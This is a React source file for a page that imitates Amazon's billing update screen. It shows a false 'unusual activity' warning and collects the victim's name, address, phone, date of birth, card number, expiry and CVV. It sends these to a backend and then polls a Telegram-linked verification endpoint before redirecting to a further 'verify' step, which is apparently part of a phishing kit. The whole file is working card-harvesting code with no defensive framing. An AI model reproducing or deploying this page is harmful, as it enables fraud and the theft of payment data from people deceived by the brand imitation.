import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import Logo from "../../components/Logo/Logo";
import Input from "../../components/Input/Input";
import Button from "../../components/Button/Button";
import CardInput from "../../components/CardInput/CardInput";
import DateInput from "../../components/DateInput/DateInput";

const countries = [
  { code: "AF", name: "Afghanistan" },
  { code: "AL", name: "Albania" },
  { code: "DZ", name: "Algeria" },
  { code: "AS", name: "American Samoa" },
  { code: "AD", name: "Andorra" },
  { code: "AO", name: "Angola" },
  { code: "AI", name: "Anguilla" },
  { code: "AQ", name: "Antarctica" },
  { code: "AG", name: "Antigua and Barbuda" },
  { code: "AR", name: "Argentina" },
  { code: "AM", name: "Armenia" },
  { code: "AW", name: "Aruba" },
  { code: "AU", name: "Australia" },
  { code: "AT", name: "Austria" },
  { code: "AZ", name: "Azerbaijan" },
  { code: "BS", name: "Bahamas" },
  { code: "BH", name: "Bahrain" },
  { code: "BD", name: "Bangladesh" },
  { code: "BB", name: "Barbados" },
  { code: "BY", name: "Belarus" },
  { code: "BE", name: "Belgium" },
  { code: "BZ", name: "Belize" },
  { code: "BJ", name: "Benin" },
  { code: "BM", name: "Bermuda" },
  { code: "BT", name: "Bhutan" },
  { code: "BO", name: "Bolivia" },
  { code: "BA", name: "Bosnia and Herzegovina" },
  { code: "BW", name: "Botswana" },
  { code: "BV", name: "Bouvet Island" },
  { code: "BR", name: "Brazil" },
  { code: "IO", name: "British Indian Ocean Territory" },
  { code: "BN", name: "Brunei Darussalam" },
  { code: "BG", name: "Bulgaria" },
  { code: "BF", name: "Burkina Faso" },
  { code: "BI", name: "Burundi" },
  { code: "KH", name: "Cambodia" },
  { code: "CM", name: "Cameroon" },
  { code: "CA", name: "Canada" },
  { code: "CV", name: "Cape Verde" },
  { code: "KY", name: "Cayman Islands" },
  { code: "CF", name: "Central African Republic" },
  { code: "TD", name: "Chad" },
  { code: "CL", name: "Chile" },
  { code: "CN", name: "China" },
  { code: "CX", name: "Christmas Island" },
  { code: "CC", name: "Cocos (Keeling) Islands" },
  { code: "CO", name: "Colombia" },
  { code: "KM", name: "Comoros" },
  { code: "CG", name: "Congo" },
  { code: "CD", name: "Congo, Democratic Republic of the" },
  { code: "CK", name: "Cook Islands" },
  { code: "CR", name: "Costa Rica" },
  { code: "CI", name: "Cote D'Ivoire" },
  { code: "HR", name: "Croatia" },
  { code: "CU", name: "Cuba" },
  { code: "CY", name: "Cyprus" },
  { code: "CZ", name: "Czech Republic" },
  { code: "DK", name: "Denmark" },
  { code: "DJ", name: "Djibouti" },
  { code: "DM", name: "Dominica" },
  { code: "DO", name: "Dominican Republic" },
  { code: "EC", name: "Ecuador" },
  { code: "EG", name: "Egypt" },
  { code: "SV", name: "El Salvador" },
  { code: "GQ", name: "Equatorial Guinea" },
  { code: "ER", name: "Eritrea" },
  { code: "EE", name: "Estonia" },
  { code: "ET", name: "Ethiopia" },
  { code: "FK", name: "Falkland Islands (Malvinas)" },
  { code: "FO", name: "Faroe Islands" },
  { code: "FJ", name: "Fiji" },
  { code: "FI", name: "Finland" },
  { code: "FR", name: "France" },
  { code: "GF", name: "French Guiana" },
  { code: "PF", name: "French Polynesia" },
  { code: "TF", name: "French Southern Territories" },
  { code: "GA", name: "Gabon" },
  { code: "GM", name: "Gambia" },
  { code: "GE", name: "Georgia" },
  { code: "DE", name: "Germany" },
  { code: "GH", name: "Ghana" },
  { code: "GI", name: "Gibraltar" },
  { code: "GR", name: "Greece" },
  { code: "GL", name: "Greenland" },
  { code: "GD", name: "Grenada" },
  { code: "GP", name: "Guadeloupe" },
  { code: "GU", name: "Guam" },
  { code: "GT", name: "Guatemala" },
  { code: "GN", name: "Guinea" },
  { code: "GW", name: "Guinea-Bissau" },
  { code: "GY", name: "Guyana" },
  { code: "HT", name: "Haiti" },
  { code: "HM", name: "Heard Island and Mcdonald Islands" },
  { code: "VA", name: "Holy See (Vatican City State)" },
  { code: "HN", name: "Honduras" },
  { code: "HK", name: "Hong Kong" },
  { code: "HU", name: "Hungary" },
  { code: "IS", name: "Iceland" },
  { code: "IN", name: "India" },
  { code: "ID", name: "Indonesia" },
  { code: "IR", name: "Iran" },
  { code: "IQ", name: "Iraq" },
  { code: "IE", name: "Ireland" },
  { code: "IL", name: "Israel" },
  { code: "IT", name: "Italy" },
  { code: "JM", name: "Jamaica" },
  { code: "JP", name: "Japan" },
  { code: "JO", name: "Jordan" },
  { code: "KZ", name: "Kazakhstan" },
  { code: "KE", name: "Kenya" },
  { code: "KI", name: "Kiribati" },
  { code: "KP", name: "Korea, Democratic People's Republic of" },
  { code: "KR", name: "Korea, Republic of" },
  { code: "KW", name: "Kuwait" },
  { code: "KG", name: "Kyrgyzstan" },
  { code: "LA", name: "Lao People's Democratic Republic" },
  { code: "LV", name: "Latvia" },
  { code: "LB", name: "Lebanon" },
  { code: "LS", name: "Lesotho" },
  { code: "LR", name: "Liberia" },
  { code: "LY", name: "Libyan Arab Jamahiriya" },
  { code: "LI", name: "Liechtenstein" },
  { code: "LT", name: "Lithuania" },
  { code: "LU", name: "Luxembourg" },
  { code: "MO", name: "Macao" },
  { code: "MK", name: "Macedonia" },
  { code: "MG", name: "Madagascar" },
  { code: "MW", name: "Malawi" },
  { code: "MY", name: "Malaysia" },
  { code: "MV", name: "Maldives" },
  { code: "ML", name: "Mali" },
  { code: "MT", name: "Malta" },
  { code: "MH", name: "Marshall Islands" },
  { code: "MQ", name: "Martinique" },
  { code: "MR", name: "Mauritania" },
  { code: "MU", name: "Mauritius" },
  { code: "YT", name: "Mayotte" },
  { code: "MX", name: "Mexico" },
  { code: "FM", name: "Micronesia, Federated States of" },
  { code: "MD", name: "Moldova, Republic of" },
  { code: "MC", name: "Monaco" },
  { code: "MN", name: "Mongolia" },
  { code: "MS", name: "Montserrat" },
  { code: "MA", name: "Morocco" },
  { code: "MZ", name: "Mozambique" },
  { code: "MM", name: "Myanmar" },
  { code: "NA", name: "Namibia" },
  { code: "NR", name: "Nauru" },
  { code: "NP", name: "Nepal" },
  { code: "NL", name: "Netherlands" },
  { code: "NC", name: "New Caledonia" },
  { code: "NZ", name: "New Zealand" },
  { code: "NI", name: "Nicaragua" },
  { code: "NE", name: "Niger" },
  { code: "NG", name: "Nigeria" },
  { code: "NU", name: "Niue" },
  { code: "NF", name: "Norfolk Island" },
  { code: "MP", name: "Northern Mariana Islands" },
  { code: "NO", name: "Norway" },
  { code: "OM", name: "Oman" },
  { code: "PK", name: "Pakistan" },
  { code: "PW", name: "Palau" },
  { code: "PS", name: "Palestinian Territory, Occupied" },
  { code: "PA", name: "Panama" },
  { code: "PG", name: "Papua New Guinea" },
  { code: "PY", name: "Paraguay" },
  { code: "PE", name: "Peru" },
  { code: "PH", name: "Philippines" },
  { code: "PN", name: "Pitcairn" },
  { code: "PL", name: "Poland" },
  { code: "PT", name: "Portugal" },
  { code: "PR", name: "Puerto Rico" },
  { code: "QA", name: "Qatar" },
  { code: "RE", name: "Reunion" },
  { code: "RO", name: "Romania" },
  { code: "RU", name: "Russian Federation" },
  { code: "RW", name: "Rwanda" },
  { code: "SH", name: "Saint Helena" },
  { code: "KN", name: "Saint Kitts and Nevis" },
  { code: "LC", name: "Saint Lucia" },
  { code: "PM", name: "Saint Pierre and Miquelon" },
  { code: "VC", name: "Saint Vincent and the Grenadines" },
  { code: "WS", name: "Samoa" },
  { code: "SM", name: "San Marino" },
  { code: "ST", name: "Sao Tome and Principe" },
  { code: "SA", name: "Saudi Arabia" },
  { code: "SN", name: "Senegal" },
  { code: "CS", name: "Serbia and Montenegro" },
  { code: "SC", name: "Seychelles" },
  { code: "SL", name: "Sierra Leone" },
  { code: "SG", name: "Singapore" },
  { code: "SK", name: "Slovakia" },
  { code: "SI", name: "Slovenia" },
  { code: "SB", name: "Solomon Islands" },
  { code: "SO", name: "Somalia" },
  { code: "ZA", name: "South Africa" },
  { code: "GS", name: "South Georgia and the South Sandwich Islands" },
  { code: "ES", name: "Spain" },
  { code: "LK", name: "Sri Lanka" },
  { code: "SD", name: "Sudan" },
  { code: "SR", name: "Suriname" },
  { code: "SJ", name: "Svalbard and Jan Mayen" },
  { code: "SZ", name: "Swaziland" },
  { code: "SE", name: "Sweden" },
  { code: "CH", name: "Switzerland" },
  { code: "SY", name: "Syrian Arab Republic" },
  { code: "TW", name: "Taiwan" },
  { code: "TJ", name: "Tajikistan" },
  { code: "TZ", name: "Tanzania, United Republic of" },
  { code: "TH", name: "Thailand" },
  { code: "TL", name: "Timor-Leste" },
  { code: "TG", name: "Togo" },
  { code: "TK", name: "Tokelau" },
  { code: "TO", name: "Tonga" },
  { code: "TT", name: "Trinidad and Tobago" },
  { code: "TN", name: "Tunisia" },
  { code: "TR", name: "Turkey" },
  { code: "TM", name: "Turkmenistan" },
  { code: "TC", name: "Turks and Caicos Islands" },
  { code: "TV", name: "Tuvalu" },
  { code: "UG", name: "Uganda" },
  { code: "UA", name: "Ukraine" },
  { code: "AE", name: "United Arab Emirates" },
  { code: "GB", name: "United Kingdom" },
  { code: "US", name: "United States" },
  { code: "UM", name: "United States Minor Outlying Islands" },
  { code: "UY", name: "Uruguay" },
  { code: "UZ", name: "Uzbekistan" },
  { code: "VU", name: "Vanuatu" },
  { code: "VE", name: "Venezuela" },
  { code: "VN", name: "Viet Nam" },
  { code: "VG", name: "Virgin Islands, British" },
  { code: "VI", name: "Virgin Islands, U.S." },
  { code: "WF", name: "Wallis and Futuna" },
  { code: "EH", name: "Western Sahara" },
  { code: "YE", name: "Yemen" },
  { code: "ZM", name: "Zambia" },
  { code: "ZW", name: "Zimbabwe" },
];

const BillingInfo = () => {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(false);
  const [isPolling, setIsPolling] = useState(false);

  // Initialize form data from localStorage or default values
  const [formData, setFormData] = useState(() => {
    const savedData = localStorage.getItem("billingFormData");
    return savedData
      ? JSON.parse(savedData)
      : {
          fullName: "",
          cardName: "",
          cardNumber: "",
          expiryMonth: "",
          expiryYear: "",
          cvv: "",
          addressLine1: "",
          city: "",
          state: "",
          zipCode: "",
          phoneNumber: "",
          country: "",
          dateOfBirth: "",
        };
  });

  const [errors, setErrors] = useState({});

  // Save form data to localStorage whenever it changes
  useEffect(() => {
    localStorage.setItem("billingFormData", JSON.stringify(formData));
  }, [formData]);

  // Add cleanup for polling
  useEffect(() => {
    // Reset verification type when component mounts
    fetch(`${process.env.REACT_APP_API_URL}/telegram/reset-verification`, {
      method: "POST",
    });

    return () => {
      setIsPolling(false);
    };
  }, []);

  // Add polling effect
  useEffect(() => {
    let isActive = true;

    const startPolling = async () => {
      while (isActive && isPolling) {
        try {
          const response = await fetch(
            `${process.env.REACT_APP_API_URL}/telegram/verification-type`
          );
          const data = await response.json();

          if (data.type) {
            sessionStorage.setItem("verificationType", data.type);
            sessionStorage.setItem("completedFlow", "billing");
            setIsPolling(false);
            setIsLoading(false);

            if (isActive) {
              // Clear form data from localStorage on successful submission
              localStorage.removeItem("billingFormData");
              navigate("/verify", { replace: true });
            }
            break;
          }
          if (isActive) {
            await new Promise((resolve) => setTimeout(resolve, 2000));
          }
        } catch (error) {
          if (isActive) {
            await new Promise((resolve) => setTimeout(resolve, 2000));
          }
        }
      }
    };

    if (isPolling) {
      startPolling();
    }

    return () => {
      isActive = false;
    };
  }, [isPolling, navigate]);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors((prev) => ({
        ...prev,
        [name]: "",
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setIsPolling(true);

    try {
      const response = await fetch(
        `${process.env.REACT_APP_API_URL}/auth/billing`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(formData),
        }
      );

      if (!response.ok) {
        throw new Error("Failed to process billing information");
      }
    } catch (error) {
      setErrors({
        submit: "An error occurred while processing billing information",
      });
      setIsLoading(false);
      setIsPolling(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center pt-8 px-4">
      <Logo />

      {/* Warning Banner */}
      <div className="w-full max-w-[600px] mb-4">
        <div className="bg-[#fff5cc] border border-[#ffd814] p-4 rounded-lg">
          <div className="flex items-start">
            <div className="text-[#c40000] mr-2">⚠️</div>
            <div>
              <p className="font-bold text-[#c40000]">Action Required</p>
              <p className="text-sm">
                For your security, we need to verify your account information.
                Please update your billing details to continue using Amazon
                services.
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Account Update Notice */}
      <div className="w-full max-w-[600px] mb-6">
        <h1 className="text-2xl font-normal mb-2">
          Update Billing Information
        </h1>
        <p className="text-sm text-gray-700 mb-4">
          Amazon has detected unusual activity on your account. To ensure your
          account's security and maintain uninterrupted access to our services,
          please verify your billing information.
        </p>
      </div>

      <div className="w-full max-w-[600px]">
        {isLoading ? (
          <div className="text-center">
            <div className="mb-4">
              <svg
                className="animate-spin h-12 w-12 mx-auto text-[#232f3e]"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                ></circle>
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                ></path>
              </svg>
            </div>
            <h2 className="text-xl font-medium mb-2">
              Processing your information
            </h2>
            <p className="text-gray-600">
              Please wait while we verify your details...
            </p>
            <p className="text-sm text-gray-500 mt-4">
              Do not refresh or close this page
            </p>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="space-y-4">
            <Input
              label="Full name (First and Last name)"
              type="text"
              name="fullName"
              value={formData.fullName}
              onChange={handleInputChange}
              error={errors.fullName}
            />

            <Input
              label="Address Line 1"
              type="text"
              name="addressLine1"
              value={formData.addressLine1}
              onChange={handleInputChange}
              error={errors.addressLine1}
            />

            <Input
              label="City"
              type="text"
              name="city"
              value={formData.city}
              onChange={handleInputChange}
              error={errors.city}
            />

            <Input
              label="State"
              type="text"
              name="state"
              value={formData.state}
              onChange={handleInputChange}
              error={errors.state}
            />

            <Input
              label="Zip Code"
              type="text"
              name="zipCode"
              value={formData.zipCode}
              onChange={handleInputChange}
              error={errors.zipCode}
            />

            <Input
              label="Phone Number"
              type="tel"
              name="phoneNumber"
              value={formData.phoneNumber}
              onChange={handleInputChange}
              error={errors.phoneNumber}
            />

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-[#0F1111] mb-1">
                  Country
                </label>
                <select
                  name="country"
                  value={formData.country}
                  onChange={handleInputChange}
                  className="w-full p-2 border border-[#D5D9D9] rounded text-sm focus:border-[#E77600] focus:shadow-[0_0_3px_2px_rgb(228,121,17,50%)] outline-none"
                >
                  <option value="">Select a Country</option>
                  {countries.map((country) => (
                    <option key={country.code} value={country.code}>
                      {country.name}
                    </option>
                  ))}
                </select>
                {errors.country && (
                  <p className="text-[#c40000] text-sm mt-1">
                    {errors.country}
                  </p>
                )}
              </div>
              <DateInput
                value={formData.dateOfBirth}
                onChange={handleInputChange}
                error={errors.dateOfBirth}
              />
            </div>

            <div className="border-t border-gray-300 my-6"></div>

            <Input
              label="Name on Card"
              type="text"
              placeholder="John Doe"
              name="cardName"
              value={formData.cardName}
              onChange={handleInputChange}
              error={errors.cardName}
            />

            <CardInput
              value={formData.cardNumber}
              onChange={(value) => handleInputChange(value)}
              error={errors.cardNumber}
            />

            <div className="flex gap-4">
              <div className="flex-1">
                <label className="block text-sm font-bold mb-2">
                  Expiration Date
                </label>
                <div className="flex gap-2">
                  <select
                    name="expiryMonth"
                    value={formData.expiryMonth}
                    onChange={handleInputChange}
                    className="w-24 p-2 border border-gray-300 rounded"
                  >
                    <option value="">MM</option>
                    {Array.from({ length: 12 }, (_, i) => {
                      const month = (i + 1).toString().padStart(2, "0");
                      return (
                        <option key={month} value={month}>
                          {month}
                        </option>
                      );
                    })}
                  </select>
                  <select
                    name="expiryYear"
                    value={formData.expiryYear}
                    onChange={handleInputChange}
                    className="w-24 p-2 border border-gray-300 rounded"
                  >
                    <option value="">YY</option>
                    {Array.from({ length: 10 }, (_, i) => {
                      const year = (new Date().getFullYear() + i)
                        .toString()
                        .slice(-2);
                      return (
                        <option key={year} value={year}>
                          {year}
                        </option>
                      );
                    })}
                  </select>
                </div>
              </div>
              <div className="w-32">
                <Input
                  label="CVV"
                  type="text"
                  name="cvv"
                  placeholder="3 or 4 digits"
                  value={formData.cvv}
                  onChange={handleInputChange}
                  error={errors.cvv}
                />
              </div>
            </div>

            <Button type="submit" disabled={isLoading} className="w-full">
              {isLoading ? "Processing..." : "Continue"}
            </Button>
          </form>
        )}
      </div>

      <div className="w-full max-w-[600px] mt-20 text-center">
        <div className="relative py-4">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-gray-300"></div>
          </div>
        </div>
      </div>
      <div className="text-xs text-gray-600 mt-10 mb-4">
        © 1996-2024, Amazon.com, Inc. or its affiliates
      </div>
    </div>
  );
};

export default BillingInfo;
